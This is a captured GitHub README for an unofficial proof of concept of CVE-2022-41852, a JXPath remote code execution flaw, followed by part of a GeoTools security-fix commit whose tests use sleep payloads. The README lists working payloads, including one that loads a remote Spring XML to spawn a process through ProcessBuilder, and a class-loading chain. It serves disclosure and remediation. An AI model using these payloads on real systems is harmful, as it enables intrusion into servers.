[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Warxim%2FCVE-2022-41852)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Warxim](/Warxim)
/
**[CVE-2022-41852](/Warxim/CVE-2022-41852)**
Public

* [Notifications](/login?return_to=%2FWarxim%2FCVE-2022-41852) You must be signed in to change notification settings
* [Fork
  16](/login?return_to=%2FWarxim%2FCVE-2022-41852)
* [Star
   74](/login?return_to=%2FWarxim%2FCVE-2022-41852)

CVE-2022-41852 Proof of Concept (unofficial)

[hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/](https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/ "https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/")

[74
stars](/Warxim/CVE-2022-41852/stargazers) [16
forks](/Warxim/CVE-2022-41852/forks) [Branches](/Warxim/CVE-2022-41852/branches) [Tags](/Warxim/CVE-2022-41852/tags) [Activity](/Warxim/CVE-2022-41852/activity)
 [Star](/login?return_to=%2FWarxim%2FCVE-2022-41852)

 [Notifications](/login?return_to=%2FWarxim%2FCVE-2022-41852) You must be signed in to change notification settings

* [Code](/Warxim/CVE-2022-41852)
* [Issues
  0](/Warxim/CVE-2022-41852/issues)
* [Pull requests
  0](/Warxim/CVE-2022-41852/pulls)
* [Actions](/Warxim/CVE-2022-41852/actions)
* [Projects
  0](/Warxim/CVE-2022-41852/projects)
* [Security](/Warxim/CVE-2022-41852/security)
* [Insights](/Warxim/CVE-2022-41852/pulse)

Additional navigation options

* [Code](/Warxim/CVE-2022-41852)
* [Issues](/Warxim/CVE-2022-41852/issues)
* [Pull requests](/Warxim/CVE-2022-41852/pulls)
* [Actions](/Warxim/CVE-2022-41852/actions)
* [Projects](/Warxim/CVE-2022-41852/projects)
* [Security](/Warxim/CVE-2022-41852/security)
* [Insights](/Warxim/CVE-2022-41852/pulse)

# Warxim/CVE-2022-41852

   ¬†main[Branches](/Warxim/CVE-2022-41852/branches)[Tags](/Warxim/CVE-2022-41852/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit¬†History[9 Commits](/Warxim/CVE-2022-41852/commits/main/) | | |
| [src/main](/Warxim/CVE-2022-41852/tree/main/src/main "This path skips through empty directories") | | [src/main](/Warxim/CVE-2022-41852/tree/main/src/main "This path skips through empty directories") |  |  |
| [.gitignore](/Warxim/CVE-2022-41852/blob/main/.gitignore ".gitignore") | | [.gitignore](/Warxim/CVE-2022-41852/blob/main/.gitignore ".gitignore") |  |  |
| [README.md](/Warxim/CVE-2022-41852/blob/main/README.md "README.md") | | [README.md](/Warxim/CVE-2022-41852/blob/main/README.md "README.md") |  |  |
| [pom.xml](/Warxim/CVE-2022-41852/blob/main/pom.xml "pom.xml") | | [pom.xml](/Warxim/CVE-2022-41852/blob/main/pom.xml "pom.xml") |  |  |
| View all files | | |

## Repository files navigation

* README
# Remote Code Execution in JXPath Library (CVE-2022-41852) Proof of Concept

CVE-2022-41852 allows attackers to execute code on the application server.

You can read more about this vulnerability here:

* <https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/>

***Note:** I am not an author of this CVE. I have only created this proof of concept.*

## Useful Links

* [JXPath GitHub](https://github.com/apache/commons-jxpath)
* [JXPath Website](https://commons.apache.org/proper/commons-jxpath/users-guide.html)
* [MITRE CVE-2022-41852](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41852)
* [NIST CVE-2022-41852](https://nvd.nist.gov/vuln/detail/CVE-2022-41852)

## Vulnerability Description

JXPath library has support for running functions in XPath expressions
(see [Official User Guide](https://commons.apache.org/proper/commons-jxpath/users-guide.html#Standard_Extension_Functions)).

For example, methods `JXPathContext.getValue(path)` and `JXPathContext.iterate(path)` are dangerous
if you let user send input into the path parameter.

## PoC Description

This PoC starts simple Spring server with two endpoints:

* `/vulnerable-example?path=[path]`
* `/secure-example?path=[path]`

These endpoints have only one query parameter "path".

### Possible Request URLs

Following requests will work fine (will not cause any problems):

* <http://localhost:8080/secure-example?path=name>
* <http://localhost:8080/secure-example?path=website>
* <http://localhost:8080/secure-example?path=/>
* <http://localhost:8080/vulnerable-example?path=name>
* <http://localhost:8080/vulnerable-example?path=website>
* <http://localhost:8080/vulnerable-example?path=/>

Following requests will cause code to be executed:

* <http://localhost:8080/vulnerable-example?path=java.lang.System.exit(42)>
* <http://localhost:8080/vulnerable-example?path=java.lang.Thread.sleep(10000)>

## Example Payloads

Example payloads to detect CVE-2022-41852:

* `java.lang.System.exit(42)`
* `java.lang.Thread.sleep(10000)`
* `/|java.lang.System.exit(42)`
* `|java.lang.System.exit(42)`

There might be various ways to execute commands. One of them is using Spring's ClassPathXmlApplicationContext:

* `org.springframework.context.support.ClassPathXmlApplicationContext.new("https://warxim.com/calc.xml")`

In the XML file, you can define bean configuration, for example, you can create instance of `ProcessBuilder`
and run specified command on the server by initializing the bean using `start()` method.
In the following example, calculator will be opened on Windows machine:

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="commandRunner" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[calc]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

There is also a way to load new classes by traversing the context bean, for example, the following code will load class `com.warxim.dangerous.DangerousClass`, create its instance and call method `run("warxim")`:

```
JXPathContext context = JXPathContext.newContext(new Data());
String jxPath = "run(newInstance(loadClass(getClassLoader(getClass(/)), \"com.warxim.dangerous.DangerousClass\")), \"warxim\")"
Object result = context.getValue(jxPath);
```

Notice that we have to call the object methods by putting the object that contains them as a first parameter.

## Workaround for CVE-2022-41852

It is possible to disable functions in JXPathContext by setting functions field to empty `FunctionLibrary`.

```
// Create path context for person object
var pathContext = JXPathContext.newContext(person);

// Set empty function library
pathContext.setFunctions(new FunctionLibrary());

// getValue will throw org.apache.commons.jxpath.JXPathFunctionNotFoundException
return pathContext.getValue(path);
```

***Note:** It will disable all functions, so even functions like `size()` will not be available.*

## Fix

The fix is being developed, see [apache/commons-jxpath#26](https://github.com/apache/commons-jxpath/pull/26)

## About

CVE-2022-41852 Proof of Concept (unofficial)

[hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/](https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/ "https://hackinglab.cz/en/blog/remote-code-execution-in-jxpath-library-cve-2022-41852/")

### Topics

[security](/topics/security "Topic: security")
[proof-of-concept](/topics/proof-of-concept "Topic: proof-of-concept")
[hacking](/topics/hacking "Topic: hacking")
[penetration-testing](/topics/penetration-testing "Topic: penetration-testing")
[rce](/topics/rce "Topic: rce")
[vulnerability](/topics/vulnerability "Topic: vulnerability")
[pentesting](/topics/pentesting "Topic: pentesting")
[cve](/topics/cve "Topic: cve")
[remote-code-execution](/topics/remote-code-execution "Topic: remote-code-execution")
[cve-2022-41852](/topics/cve-2022-41852 "Topic: cve-2022-41852")
[jxpath](/topics/jxpath "Topic: jxpath")

### Resources

[Readme](#readme-ov-file)

[Activity](/Warxim/CVE-2022-41852/activity)
### Stars

[**74**
stars](/Warxim/CVE-2022-41852/stargazers)
### Watchers

[**3**
watching](/Warxim/CVE-2022-41852/watchers)
### Forks

[**16**
forks](/Warxim/CVE-2022-41852/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FWarxim%2FCVE-2022-41852&report=Warxim+%28user%29)

## [Releases](/Warxim/CVE-2022-41852/releases)

No releases published

## [Packages 0](/users/Warxim/packages?repo_name=CVE-2022-41852)

No packages published

## Languages

* [Java
  100.0%](/Warxim/CVE-2022-41852/search?l=java)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_ea6481a1_20250111_082230.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fcommit%2Ff0c9961dc4d40c5acfce2169fab92805738de5ea)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fcommit%2Ff0c9961dc4d40c5acfce2169fab92805738de5ea)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=geotools%2Fgeotools)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[geotools](/geotools)
/
**[geotools](/geotools/geotools)**
Public

* [Notifications](/login?return_to=%2Fgeotools%2Fgeotools) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fgeotools%2Fgeotools)
* [Star
   1.7k](/login?return_to=%2Fgeotools%2Fgeotools)

* [Code](/geotools/geotools)
* [Pull requests
  3](/geotools/geotools/pulls)
* [Actions](/geotools/geotools/actions)
* [Projects
  0](/geotools/geotools/projects)
* [Wiki](/geotools/geotools/wiki)
* [Security](/geotools/geotools/security)
* [Insights](/geotools/geotools/pulse)

Additional navigation options

* [Code](/geotools/geotools)
* [Pull requests](/geotools/geotools/pulls)
* [Actions](/geotools/geotools/actions)
* [Projects](/geotools/geotools/projects)
* [Wiki](/geotools/geotools/wiki)
* [Security](/geotools/geotools/security)
* [Insights](/geotools/geotools/pulse)

## Commit

[Permalink](/geotools/geotools/commit/f0c9961dc4d40c5acfce2169fab92805738de5ea)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[GEOT-7587] Improve handling of XPath expressions

[Browse files](/geotools/geotools/tree/f0c9961dc4d40c5acfce2169fab92805738de5ea)
Browse the repository at this point in the history

* Loading branch information

[![@sikeoka](https://avatars.githubusercontent.com/u/11542093?s=40&v=4)](/sikeoka) [![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=40&v=4)](/jodygarnett)

[sikeoka](/geotools/geotools/commits?author=sikeoka "View all commits by sikeoka")
authored and
[jodygarnett](/geotools/geotools/commits?author=jodygarnett "View all commits by jodygarnett")
committed
Jun 5, 2024

1 parent
[0d1758f](/geotools/geotools/commit/0d1758f8f5db19d43acc36d8df46c1b55eb24dad)

commit f0c9961

 Show file tree

 Hide file tree

Showing
**10 changed files**
with
**200 additions**
and
**63 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* modules/extension

  + app-schema/app-schema/src

    - main/java/org/geotools/appschema/util

      * modules/extension/app-schema/app-schema/src/main/java/org/geotools/appschema/util/XmlXpathUtilites.java
        [XmlXpathUtilites.java](#diff-0d45aac62dabd22e8f5a110d5ef32c6d238f64d9ddddfc4b0854dec73fde9b7d)
    - test/java/org/geotools/appschema/util

      * modules/extension/app-schema/app-schema/src/test/java/org/geotools/appschema/util/XmlXpathUtilitesTest.java
        [XmlXpathUtilitesTest.java](#diff-6885fe15ef8cfb44745077cce6d34696308e0cb64b793d96dfb686e3df29cbe8)
  + complex/src

    - main/java/org/geotools/data/complex/expression

      * modules/extension/complex/src/main/java/org/geotools/data/complex/expression/FeaturePropertyAccessorFactory.java
        [FeaturePropertyAccessorFactory.java](#diff-a4ed841fe4f8d1ef6262ee61a6b0e8ae4a4d27b10d5d4eb2ec7f4d3c3b99d775)
      * modules/extension/complex/src/main/java/org/geotools/data/complex/expression/MapPropertyAccessorFactory.java
        [MapPropertyAccessorFactory.java](#diff-9b3e535eb00a5259cf626e5049d7259f6b7dd837a35c620dade7bfa21a60f4b3)
    - test/java/org/geotools/filter/expression

      * modules/extension/complex/src/test/java/org/geotools/filter/expression/FeaturePropertyAccessorTest.java
        [FeaturePropertyAccessorTest.java](#diff-e7291403b36ac2cf7efe976006490c89af1c3fde587fc34023b63feae8ba4817)
      * modules/extension/complex/src/test/java/org/geotools/filter/expression/MapPropertyAccessorTest.java
        [MapPropertyAccessorTest.java](#diff-21f2f90abb817ad816e8b0e219c2b7f2b214ac27230fbb31674bb198d901d2dc)
  + xsd/xsd-core

    - modules/extension/xsd/xsd-core/pom.xml
      [pom.xml](#diff-3370380dd98e9749adebc91465fad1dd51cac90b4e76fd8ca9278ebca1accdd2)
    - src

      * main/java/org/geotools/xsd/impl/jxpath

        + modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathStreamingParserHandler.java
          [JXPathStreamingParserHandler.java](#diff-b33465a0672c5154fabc7c5fff76f88771995e72445f2fb486cf7deb187c2c53)
        + modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathUtils.java
          [JXPathUtils.java](#diff-6e0fd86b25d51c6240ad166fd0ac1d8d4e3afd3c5612841d07c2b9a2c4914cf2)
      * test/java/org/geotools/xsd

        + modules/extension/xsd/xsd-core/src/test/java/org/geotools/xsd/StreamingParserTest.java
          [StreamingParserTest.java](#diff-35b25d78737fbba349f6122e6ed3373ae5c731a563172be688c4ec24e1a296b6)

## There are no files selected for viewing

24 changes: 3 additions & 21 deletions

24
[...ion/app-schema/app-schema/src/main/java/org/geotools/appschema/util/XmlXpathUtilites.java](#diff-0d45aac62dabd22e8f5a110d5ef32c6d238f64d9ddddfc4b0854dec73fde9b7d "modules/extension/app-schema/app-schema/src/main/java/org/geotools/appschema/util/XmlXpathUtilites.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/app-schema/app-schema/src/main/java/org/geotools/appschema/util/XmlXpathUtilites.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -18,10 +18,10 @@ |
|  |  | package org.geotools.appschema.util; |
|  |  |  |
|  |  | import java.util.ArrayList; |
|  |  | import java.util.Enumeration; |
|  |  | import java.util.List; |
|  |  | import java.util.Scanner; |
|  |  | import org.apache.commons.jxpath.JXPathContext; |
|  |  | import org.geotools.xsd.impl.jxpath.JXPathUtils; |
|  |  | import org.jdom2.Document; |
|  |  | import org.xml.sax.helpers.NamespaceSupport; |
|  |  |  |
| Expand All | | @@ -41,7 +41,7 @@ public class XmlXpathUtilites { |
|  |  | \*/ |
|  |  | public static List<String> getXPathValues( |
|  |  | NamespaceSupport ns, String xpathString, Document doc) { |
|  |  | JXPathContext context = initialiseContext(ns, doc); |
|  |  | JXPathContext context = JXPathUtils.newSafeContext(doc, true, ns, false); |
|  |  | return getXPathValues(xpathString, context); |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -69,33 +69,15 @@ public static int countXPathNodes(NamespaceSupport ns, String xpathString, Docum |
|  |  | public static String getSingleXPathValue( |
|  |  | NamespaceSupport ns, String xpathString, Document doc) { |
|  |  | String id = null; |
|  |  | JXPathContext context = initialiseContext(ns, doc); |
|  |  | try { |
|  |  | Object ob = context.getValue(xpathString); |
|  |  | Object ob = JXPathUtils.newSafeContext(doc, true, ns, false).getValue(xpathString); |
|  |  | id = (String) ob; |
|  |  | } catch (RuntimeException e) { |
|  |  | throw new RuntimeException("Error reading xpath " + xpathString, e); |
|  |  | } |
|  |  | return id; |
|  |  | } |
|  |  |  |
|  |  | private static JXPathContext initialiseContext(NamespaceSupport ns, Document doc) { |
|  |  | JXPathContext context = JXPathContext.newContext(doc); |
|  |  | addNamespaces(ns, context); |
|  |  | context.setLenient(true); |
|  |  | return context; |
|  |  | } |
|  |  |  |
|  |  | private static void addNamespaces(NamespaceSupport ns, JXPathContext context) { |
|  |  | @SuppressWarnings("unchecked") |
|  |  | Enumeration<String> prefixes = ns.getPrefixes(); |
|  |  | while (prefixes.hasMoreElements()) { |
|  |  | String prefix = prefixes.nextElement(); |
|  |  | String uri = ns.getURI(prefix); |
|  |  | context.registerNamespace(prefix, uri); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Remove indexes from an xpath string. |
|  |  | \* |
| Expand Down | |  |

58 changes: 58 additions & 0 deletions

58
[...app-schema/app-schema/src/test/java/org/geotools/appschema/util/XmlXpathUtilitesTest.java](#diff-6885fe15ef8cfb44745077cce6d34696308e0cb64b793d96dfb686e3df29cbe8 "modules/extension/app-schema/app-schema/src/test/java/org/geotools/appschema/util/XmlXpathUtilitesTest.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/app-schema/app-schema/src/test/java/org/geotools/appschema/util/XmlXpathUtilitesTest.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,58 @@ |
|  |  | /\* |
|  |  | \* GeoTools - The Open Source Java GIS Toolkit |
|  |  | \* http://geotools.org |
|  |  | \* |
|  |  | \* (C) 2024, Open Source Geospatial Foundation (OSGeo) |
|  |  | \* |
|  |  | \* This library is free software; you can redistribute it and/or |
|  |  | \* modify it under the terms of the GNU Lesser General Public |
|  |  | \* License as published by the Free Software Foundation; |
|  |  | \* version 2.1 of the License. |
|  |  | \* |
|  |  | \* This library is distributed in the hope that it will be useful, |
|  |  | \* but WITHOUT ANY WARRANTY; without even the implied warranty of |
|  |  | \* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU |
|  |  | \* Lesser General Public License for more details. |
|  |  | \*/ |
|  |  | package org.geotools.appschema.util; |
|  |  |  |
|  |  | import static org.junit.Assert.assertEquals; |
|  |  | import static org.junit.Assert.assertThrows; |
|  |  |  |
|  |  | import org.junit.Test; |
|  |  |  |
|  |  | public class XmlXpathUtilitesTest { |
|  |  |  |
|  |  | @Test |
|  |  | public void testGetXPathValuesWithJavaMethod() { |
|  |  | RuntimeException exception = |
|  |  | assertThrows( |
|  |  | RuntimeException.class, |
|  |  | () -> |
|  |  | XmlXpathUtilites.getXPathValues( |
|  |  | null, "java.lang.Thread.sleep(30000)", null)); |
|  |  | assertEquals("Error reading xpath java.lang.Thread.sleep(30000)", exception.getMessage()); |
|  |  | } |
|  |  |  |
|  |  | @Test |
|  |  | public void testCountXPathNodesWithJavaMethod() { |
|  |  | RuntimeException exception = |
|  |  | assertThrows( |
|  |  | RuntimeException.class, |
|  |  | () -> |
|  |  | XmlXpathUtilites.countXPathNodes( |
|  |  | null, "java.lang.Thread.sleep(30000)", null)); |
|  |  | assertEquals("Error reading xpath java.lang.Thread.sleep(30000)", exception.getMessage()); |
|  |  | } |
|  |  |  |
|  |  | @Test |
|  |  | public void testGetSingleXPathValueWithJavaMethod() { |
|  |  | RuntimeException exception = |
|  |  | assertThrows( |
|  |  | RuntimeException.class, |
|  |  | () -> |
|  |  | XmlXpathUtilites.getSingleXPathValue( |
|  |  | null, "java.lang.Thread.sleep(30000)", null)); |
|  |  | assertEquals("Error reading xpath java.lang.Thread.sleep(30000)", exception.getMessage()); |
|  |  | } |
|  |  | } |

25 changes: 8 additions & 17 deletions

25
[...ex/src/main/java/org/geotools/data/complex/expression/FeaturePropertyAccessorFactory.java](#diff-a4ed841fe4f8d1ef6262ee61a6b0e8ae4a4d27b10d5d4eb2ec7f4d3c3b99d775 "modules/extension/complex/src/main/java/org/geotools/data/complex/expression/FeaturePropertyAccessorFactory.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/complex/src/main/java/org/geotools/data/complex/expression/FeaturePropertyAccessorFactory.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -20,7 +20,6 @@ |
|  |  | import static org.geotools.filter.expression.SimpleFeaturePropertyAccessorFactory.DEFAULT\_GEOMETRY\_NAME; |
|  |  |  |
|  |  | import java.util.ArrayList; |
|  |  | import java.util.Enumeration; |
|  |  | import java.util.Iterator; |
|  |  | import java.util.List; |
|  |  | import java.util.regex.Pattern; |
| Expand All | | @@ -33,6 +32,7 @@ |
|  |  | import org.geotools.api.feature.GeometryAttribute; |
|  |  | import org.geotools.api.feature.IllegalAttributeException; |
|  |  | import org.geotools.api.feature.simple.SimpleFeature; |
|  |  | import org.geotools.api.feature.simple.SimpleFeatureType; |
|  |  | import org.geotools.api.feature.type.AttributeDescriptor; |
|  |  | import org.geotools.api.feature.type.AttributeType; |
|  |  | import org.geotools.api.feature.type.ComplexType; |
| Expand All | | @@ -44,6 +44,7 @@ |
|  |  | import org.geotools.filter.expression.PropertyAccessor; |
|  |  | import org.geotools.filter.expression.PropertyAccessorFactory; |
|  |  | import org.geotools.util.factory.Hints; |
|  |  | import org.geotools.xsd.impl.jxpath.JXPathUtils; |
|  |  | import org.locationtech.jts.geom.Geometry; |
|  |  | import org.xml.sax.helpers.NamespaceSupport; |
|  |  |  |
| Expand Down  Expand Up | | @@ -83,7 +84,8 @@ public class FeaturePropertyAccessorFactory implements PropertyAccessorFactory { |
|  |  | public PropertyAccessor createPropertyAccessor( |
|  |  | Class type, String xpath, Class target, Hints hints) { |
|  |  |  |
|  |  | if (SimpleFeature.class.isAssignableFrom(type)) { |
|  |  | if (SimpleFeature.class.isAssignableFrom(type) |
|  |  | || SimpleFeatureType.class.isAssignableFrom(type)) { |
|  |  | /\* |
|  |  | \* This class is not intended for use with SimpleFeature and causes problems when |
|  |  | \* discovered via SPI and used by code expecting SimpleFeature behaviour. In particular |
| Expand Down  Expand Up | | @@ -260,14 +262,8 @@ public boolean canHandle(Object object, String xpath, Class target) { |
|  |  | public <T> T get(Object object, String xpath, Class<T> target) |
|  |  | throws IllegalArgumentException { |
|  |  |  |
|  |  | JXPathContext context = JXPathContext.newContext(object); |
|  |  | Enumeration declaredPrefixes = namespaces.getDeclaredPrefixes(); |
|  |  | while (declaredPrefixes.hasMoreElements()) { |
|  |  | String prefix = (String) declaredPrefixes.nextElement(); |
|  |  | String uri = namespaces.getURI(prefix); |
|  |  | context.registerNamespace(prefix, uri); |
|  |  | } |
|  |  |  |
|  |  | JXPathContext context = |
|  |  | JXPathUtils.newSafeContext(object, false, this.namespaces, true); |
|  |  | Iterator it = context.iteratePointers(xpath); |
|  |  | List results = new ArrayList<>(); |
|  |  | while (it.hasNext()) { |
| Expand Down  Expand Up | | @@ -296,13 +292,8 @@ public void set(Object object, String xpath, Object value, Class target) |
|  |  | throw new IllegalAttributeException(null, "feature type is immutable"); |
|  |  | } |
|  |  |  |
|  |  | JXPathContext context = JXPathContext.newContext(object); |
|  |  | Enumeration declaredPrefixes = namespaces.getDeclaredPrefixes(); |
|  |  | while (declaredPrefixes.hasMoreElements()) { |
|  |  | String prefix = (String) declaredPrefixes.nextElement(); |
|  |  | String uri = namespaces.getURI(prefix); |
|  |  | context.registerNamespace(prefix, uri); |
|  |  | } |
|  |  | JXPathContext context = |
|  |  | JXPathUtils.newSafeContext(object, false, this.namespaces, true); |
|  |  | context.setValue(xpath, value); |
|  |  |  |
|  |  | assert value == context.getValue(xpath); |
| Expand Down | |  |

6 changes: 2 additions & 4 deletions

6
[...omplex/src/main/java/org/geotools/data/complex/expression/MapPropertyAccessorFactory.java](#diff-9b3e535eb00a5259cf626e5049d7259f6b7dd837a35c620dade7bfa21a60f4b3 "modules/extension/complex/src/main/java/org/geotools/data/complex/expression/MapPropertyAccessorFactory.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/complex/src/main/java/org/geotools/data/complex/expression/MapPropertyAccessorFactory.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -18,11 +18,11 @@ |
|  |  | package org.geotools.data.complex.expression; |
|  |  |  |
|  |  | import java.util.Map; |
|  |  | import org.apache.commons.jxpath.JXPathContext; |
|  |  | import org.geotools.api.feature.IllegalAttributeException; |
|  |  | import org.geotools.filter.expression.PropertyAccessor; |
|  |  | import org.geotools.filter.expression.PropertyAccessorFactory; |
|  |  | import org.geotools.util.factory.Hints; |
|  |  | import org.geotools.xsd.impl.jxpath.JXPathUtils; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* A {@link PropertyAccessorFactory} that returns a {@link PropertyAccessor} capable of evaluating |
| Expand Down  Expand Up | | @@ -63,9 +63,7 @@ public boolean canHandle(Object object, String xpath, Class target) { |
|  |  | @SuppressWarnings("unchecked") |
|  |  | public <T> T get(Object object, String xpath, Class<T> target) |
|  |  | throws IllegalArgumentException { |
|  |  | JXPathContext context = JXPathContext.newContext(object); |
|  |  | context.setLenient(true); |
|  |  | return (T) context.getValue(xpath); |
|  |  | return (T) JXPathUtils.newSafeContext(object, true).getValue(xpath); |
|  |  | } |
|  |  |  |
|  |  | @Override |
| Expand Down | |  |

14 changes: 14 additions & 0 deletions

14
[...ion/complex/src/test/java/org/geotools/filter/expression/FeaturePropertyAccessorTest.java](#diff-e7291403b36ac2cf7efe976006490c89af1c3fde587fc34023b63feae8ba4817 "modules/extension/complex/src/test/java/org/geotools/filter/expression/FeaturePropertyAccessorTest.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/complex/src/test/java/org/geotools/filter/expression/FeaturePropertyAccessorTest.java)
Edit file

Delete file

